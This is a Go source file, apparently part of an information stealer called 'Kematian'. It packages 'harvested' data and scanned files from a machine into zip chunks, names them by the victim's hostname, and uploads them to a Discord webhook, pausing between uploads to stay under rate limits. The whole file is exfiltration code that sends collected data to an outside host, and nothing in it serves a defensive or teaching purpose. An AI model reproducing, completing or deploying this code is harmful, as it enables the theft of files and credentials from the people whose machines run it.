package main

import (
	"fmt"
	"log"
)

func uploadAllHarvest(webhook, hostname string, p *harvestPayload, quiet bool) error {
	arch := p.Arch
	if arch == "" {
		arch = "mac"
	}
	baseFilename := fmt.Sprintf("%s-kematian-%s", sanitizeFilename(hostname), sanitizeFilename(arch))

	// Phase 1 must fully finish (every part uploaded) before phase 2 starts.
	if err := uploadPrimaryHarvest(webhook, baseFilename, p, quiet); err != nil {
		return err
	}

	// Discord rate-limits back-to-back webhook file uploads; wait before phase 2.
	discordUploadDelay()

	if !quiet {
		log.Printf("[kematian] primary upload complete, starting scanned files upload")
	}

	return uploadScannedFiles(webhook, baseFilename, p, quiet)
}

func uploadPrimaryHarvest(webhook, baseFilename string, p *harvestPayload, quiet bool) error {
	chunks, err := buildPrimaryZipChunks(p)
	if err != nil {
		return err
	}
	return uploadZipChunks(webhook, baseFilename, "Kematian harvest", harvestSummary(p), chunks, "harvest", quiet)
}

func uploadScannedFiles(webhook, baseFilename string, p *harvestPayload, quiet bool) error {
	fileCount := 0
	if p != nil && p.Result != nil {
		for _, f := range p.Result.Files {
			if !isEnvScannedFile(f) {
				fileCount++
			}
		}
	}
	if fileCount == 0 {
		if !quiet {
			log.Printf("[kematian] no scanned files to upload")
		}
		return nil
	}

	// Built only after primary upload has finished.
	chunks, skippedLarge, err := buildScannedFilesZipChunks(p)
	if err != nil {
		return fmt.Errorf("build scanned files zip: %w", err)
	}
	if len(chunks) == 0 {
		if !quiet && skippedLarge > 0 {
			log.Printf("[kematian] no uploadable scanned files (%d too large for Discord)", skippedLarge)
		}
		return nil
	}

	filesBase := baseFilename + "-files"
	return uploadZipChunks(webhook, filesBase, "Kematian files", scannedFilesSummary(fileCount, skippedLarge), chunks, "files", quiet)
}

func uploadZipChunks(webhook, baseFilename, title, summary string, chunks [][]byte, phaseLabel string, quiet bool) error {
	if len(chunks) == 0 {
		return nil
	}

	if !quiet {
		log.Printf("[kematian] uploading %s zip (%d part(s))", phaseLabel, len(chunks))
	}

	for i, zipData := range chunks {
		filename := baseFilename + ".zip"
		if len(chunks) > 1 {
			filename = fmt.Sprintf("%s-part%d.zip", baseFilename, i+1)
		}

		partSummary := summary
		if len(chunks) > 1 {
			partSummary += fmt.Sprintf("\n\nPart %d/%d (%d bytes)", i+1, len(chunks), len(zipData))
		}

		if !quiet {
			log.Printf("[kematian] uploading %s (%d bytes)", filename, len(zipData))
		}

		if err := sendDiscordWebhook(webhook, title, partSummary, zipData, filename); err != nil {
			return fmt.Errorf("upload %s: %w", filename, err)
		}
		// Delay after every successful upload (including the last chunk of a phase).
		discordUploadDelay()
	}
	return nil
}